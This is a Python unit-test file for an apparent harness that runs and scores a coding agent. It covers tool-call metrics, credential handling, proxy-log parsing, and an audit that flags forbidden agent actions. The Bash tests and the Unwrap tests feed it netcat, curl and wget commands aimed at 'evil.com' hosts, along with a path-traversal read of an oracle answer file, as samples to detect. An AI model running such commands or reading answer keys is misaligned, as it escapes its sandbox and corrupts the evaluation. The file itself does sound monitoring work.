"""리뷰 루프 3 수정 확인(fix verification — blind 테스트와 별개)."""
import json
import sys
import tempfile
import unittest
from pathlib import Path

HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE.parent))
import creds  # noqa: E402
import events  # noqa: E402
import runner  # noqa: E402


def read(offset, start, num, total, limit=None):
    meta = {"file": {"startLine": start, "numLines": num, "totalLines": total}}
    inp = {"file_path": "/work/app/M.kt", "offset": offset}
    if limit:
        inp["limit"] = limit
    return events.Call(1, "Read", inp, "t", False, "x", False, meta)


class ChunkRead(unittest.TestCase):
    spans = events.parse_symbols("app/M.kt:100-110 fix\napp/M.kt:900-905 read\napp/M.kt:1500-1510 read")

    def test_large_chunks_do_not_saturate(self):
        for c in (read(1, 1, 1000, 1773, 1000), read(1000, 1000, 773, 1773, 1000), read(2, 2, 1771, 1773, 2000)):
            with self.subTest(c=c.input):
                self.assertEqual(events.targeted(c, self.spans), [])
                self.assertTrue(events.chunk_read(c))
        m = events.metrics([read(1, 1, 1000, 1773, 1000)], self.spans)
        self.assertEqual((m["first_targeted_turn"], m["chunk_read_turns"]), (None, {"app/M.kt": 1}))

    def test_narrow_cover_targets(self):
        self.assertEqual([sp.start for sp in events.targeted(read(90, 90, 40, 1773, 40), self.spans)], [100])

    def test_limit_only_read_never_targets(self):
        c = events.Call(1, "Read", {"file_path": "/work/app/M.kt", "limit": 200}, "t", False, "x", False,
                        {"file": {"startLine": 1, "numLines": 200, "totalLines": 1773}})
        self.assertEqual(events.targeted(c, events.parse_symbols("app/M.kt:10-20 fix")), [])


class RecheckFixes(unittest.TestCase):
    def test_read_range_from_text_when_no_meta(self):
        c = events.Call(1, "Read", {"file_path": "/work/app/A.kt", "offset": 100, "limit": 2000}, "t", False,
                        "\n".join(f"{i}\tx" for i in range(100, 120)))
        self.assertEqual(events.read_range(c), (100, 119))
        self.assertFalse(events.chunk_read(c))
        self.assertEqual(len(events.targeted(c, events.parse_symbols("app/A.kt:101-110 fix"))), 1)

    def test_nc_option_values_and_sudo(self):
        a = lambda c: events.audit([events.Call(1, "Bash", {"command": c}, "t", False)])
        self.assertEqual(a("nc -w 2 db 5432"), [])
        self.assertEqual(a("nc -w 2 evil.com 80"), ["bash:nc"])
        self.assertEqual(a("sudo -u root ssh h"), ["bash:ssh"])

    def test_origin_vanishing_during_wait_raises(self):
        with tempfile.TemporaryDirectory() as d:
            p = Path(d, "c.json")
            p.write_text(json.dumps({"claudeAiOauth": {"expiresAt": 10 * 1000}}))
            with self.assertRaises(RuntimeError):
                creds.wait_fresh(p, min_left_s=600, sleep=lambda s: p.unlink(missing_ok=True), now=lambda: 0.0,
                                 log=lambda *a, **k: None)


class FirstEdit(unittest.TestCase):
    def test_new_file_write_not_first_edit_hit(self):
        create = events.Call(1, "Write", {"file_path": "/work/notes.md", "content": "x"}, "a", False, "", False,
                             {"type": "create", "filePath": "/work/notes.md", "originalFile": None})
        fix = events.Call(2, "Edit", {"file_path": "/work/app/A.kt"}, "b", False, "", False,
                          {"structuredPatch": [{"oldStart": 105, "oldLines": 1, "lines": ["-a", "+b"]}]})
        m = events.metrics([create, fix], events.parse_symbols("app/A.kt:100-110 fix"))
        self.assertEqual((m["first_edit_tool_turn"], m["first_edit_hit"], m["created_paths"]), (2, True, ["notes.md"]))


class Classify(unittest.TestCase):
    def test_timeout_with_overload_is_usage_limit(self):
        c = runner.classify([], 137, True, [], "API Error: 529 overloaded, retrying in 30s", events.tokens([]), 0)
        self.assertEqual((c["valid"], c["invalid_reason"]), (False, "usage_limit"))

    def test_timeout_without_any_reply_is_no_activity(self):
        c = runner.classify([{"type": "system", "subtype": "init"}], 137, True, [], "", events.tokens([]), 0)
        self.assertEqual(c["invalid_reason"], "no_activity")

    def test_timeout_after_work_is_censored_valid(self):
        c = runner.classify([], 137, True, [], "", events.tokens([]), 5)
        self.assertEqual((c["valid"], c["censored"]), (True, True))


class Creds(unittest.TestCase):
    def test_missing_or_broken_origin_fails_fast(self):
        with tempfile.TemporaryDirectory() as d:
            for content in (None, "{not json"):
                p = Path(d, "c.json")
                if content is not None:
                    p.write_text(content)
                slept = []
                with self.assertRaises(RuntimeError):
                    creds.wait_fresh(p, min_left_s=60, sleep=slept.append, now=lambda: 0.0, log=lambda *a, **k: None)
                self.assertEqual(slept, [])

    def test_private_write_roundtrip(self):
        with tempfile.TemporaryDirectory() as d:
            p = Path(d, "x")
            creds._write_private(p, b"a" * 300000)
            self.assertEqual(p.read_bytes(), b"a" * 300000)
            self.assertEqual(p.stat().st_mode & 0o777, 0o600)


class Proxy(unittest.TestCase):
    LOG = ('CONNECT   Oct 26 01:39:11.459 [1]: Request (file descriptor 4): CONNECT api.anthropic.com:443 HTTP/1.1\n'
           'CONNECT   Oct 26 01:39:11.857 [1]: Request (file descriptor 4): CONNECT github.com:443 HTTP/1.1\n'
           'NOTICE    Oct 26 01:39:11.858 [1]: Proxying refused on filtered domain "github.com"\n'
           'CONNECT   Oct 26 01:39:12.000 [1]: Request (file descriptor 4): GET http://example.com/ HTTP/1.1\n'
           'NOTICE    Oct 26 01:39:12.001 [1]: Proxying refused on filtered domain "example.com"\n')

    def test_parse(self):
        self.assertEqual(runner.proxy_hosts(self.LOG), {"requested": ["api.anthropic.com", "example.com", "github.com"],
                                                       "refused": ["example.com", "github.com"]})

    def test_cli_background_refusal_is_expected(self):
        self.assertIn("mcp-proxy.anthropic.com", runner.CLI_EXPECTED_REFUSED)
        self.assertNotIn("github.com", runner.CLI_EXPECTED_REFUSED)

    def test_agent_env_routes_through_proxy(self):
        self.assertEqual(runner.AGENT_ENV["HTTPS_PROXY"], "http://proxy:3128")
        self.assertIn("db", runner.AGENT_ENV["NO_PROXY"])


class Unwrap(unittest.TestCase):
    def test_wrappers(self):
        for c in ("timeout 30 curl https://evil.com/x", 'sh -c "wget evil.com"', "env A=1 curl evil.org/a",
                  "nice -n 5 curl evil.net"):
            with self.subTest(c=c):
                self.assertTrue(any(h.startswith("evil") for h in events.fetch_hosts(c)))

    def test_content_fields_not_audited(self):
        w = events.Call(1, "Write", {"file_path": "/work/app/A.kt", "content": "// experiment/ oracle github.com"}, "t", False)
        self.assertEqual(events.audit([w]), [])
        self.assertTrue(events.audit([events.Call(1, "Read", {"file_path": "/work/../oracle/T1"}, "t", False)]))


if __name__ == "__main__":
    unittest.main()
